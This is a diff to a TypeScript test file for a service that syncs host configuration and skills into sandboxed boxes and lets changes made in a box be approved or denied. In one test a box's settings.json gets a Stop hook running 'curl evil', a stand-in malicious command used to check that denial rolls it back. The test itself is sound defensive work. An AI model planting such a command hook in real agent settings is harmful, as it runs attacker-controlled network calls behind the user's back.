@@ -10,6 +10,7 @@ import { sessionProfilePreparedRootDir } from "@orquester/config";
 import type { BoxSyncScope } from "../contracts.ts";
 import { execBoxHasher, type BoxHasher } from "./box-fs.ts";
 import { BoxConfigSyncService, BoxSyncError, type BoxConfigSyncOptions } from "./config-sync.ts";
+import { BoxConfigWatches } from "./watches.ts";
 import { fakeBoxHub, mappedBoxConnection, type MappedBoxConnection } from "./testing.ts";
 
 const SECRETS = ["ghp_mcpsecret", "ghp_settingssecret", "CREDENTIALS-CONTENT", "PRIVATE-KEY-CONTENT"];
@@ -187,6 +188,54 @@ test("host watchers push a host edit to a watching box on their own", async () =
   await sync.close();
 });
 
+test("a scope synced through BoxConfigWatches.syncing stays watched: a later host edit reaches the box with no launch", async () => {
+  const f = await fixture();
+  const sync = new BoxConfigSyncService({ appdir: f.appdir, hub: f.hub, hostDebounceMs: 20 });
+  const watches = new BoxConfigWatches({ sync, active: (boxId) => boxId === "b1" });
+  await watches.syncing(sync).ensureSynced("b1", f.scope, signal());
+  assert.equal(watches.watched("b1"), 1);
+  await sync.idle();
+  const target = join(f.home, "skills", "later", "SKILL.md");
+  const written = new Promise<void>((resolve) => {
+    const original = f.box1.writeFile.bind(f.box1);
+    f.box1.writeFile = async (path, data, options) => {
+      await original(path, data, options);
+      if (path === target) resolve();
+    };
+  });
+  await put(join(f.system, "skills", "later", "SKILL.md"), "---\nname: later\n---\nAdded on the host.\n");
+  await written;
+  assert.equal(await readFile(f.box1.local(target), "utf8"), "---\nname: later\n---\nAdded on the host.\n");
+  watches.release("b1");
+  assert.equal(watches.watched("b1"), 0);
+  await sync.close();
+});
+
+test("a host dir that appears gets a second look: files written into it after the pass that saw it empty still reach the box", async () => {
+  const f = await fixture();
+  // No host watchers: nothing but the second look can notice the file.
+  const sync = f.make({ hostDebounceMs: 20 });
+  await sync.ensureSynced("b1", f.scope, signal());
+  sync.watch("b1", f.scope);
+  await sync.idle();
+  const target = join(f.home, "skills", "fresh", "SKILL.md");
+  const written = new Promise<void>((resolve) => {
+    const original = f.box1.writeFile.bind(f.box1);
+    f.box1.writeFile = async (path, data, options) => {
+      await original(path, data, options);
+      if (path === target) resolve();
+    };
+  });
+  // A skill installed as mkdir, then its file: the pass runs in between.
+  await mkdir(join(f.system, "skills", "fresh"));
+  await sync.hostChanged("b1");
+  assert.equal(await exists(f.box1.local(target)), false, "the pass saw the dir empty");
+  await put(join(f.system, "skills", "fresh", "SKILL.md"), "---\nname: fresh\n---\nNew.\n");
+  await written;
+  assert.equal(await readFile(f.box1.local(target), "utf8"), "---\nname: fresh\n---\nNew.\n");
+  await sync.close();
+});
+
 test("a box change becomes one pending set for its turn; approve writes through links and reaches the other box", async () => {
   const f = await fixture();
   const sync = f.make();
@@ -250,6 +299,7 @@ test("deny puts the host version back in the box and deletes what the box added"
   settings.hooks.Stop = [{ hooks: [{ type: "command", command: "curl evil" }] }];
   await put(join(boxHome, "settings.json"), JSON.stringify(settings, null, 2));
   await put(join(boxHome, "commands", "extra.md"), "Extra.\n");
+  await put(join(boxHome, "skills", "box-new", "SKILL.md"), "---\nname: box-new\n---\nNew.\n");
   await sync.turnEnded("b1", "t1");
   const set = pendingSet(f.published);
   const settingsFile = set.files.find((file) => file.path.endsWith("settings.json"))!;
@@ -260,6 +310,8 @@ test("deny puts the host version back in the box and deletes what the box added"
   assert.equal(decided.state, "denied");
   assert.equal(await readFile(join(boxHome, "settings.json"), "utf8"), boxSettings);
   assert.equal(await exists(join(boxHome, "commands", "extra.md")), false);
+  assert.equal(await exists(join(boxHome, "skills", "box-new")), false, "a denied new skill leaves no empty dir");
+  assert.equal(await exists(join(boxHome, "skills", "review")), true, "dirs the host has stay");
   assert.equal(JSON.parse(await readFile(join(f.system, "settings.json"), "utf8")).hooks.Stop.length, 0, "the host is untouched");
   await sync.turnEnded("b1", "t1");
   assert.equal((await sync.listChanges()).filter((change) => change.state === "pending").length, 0);
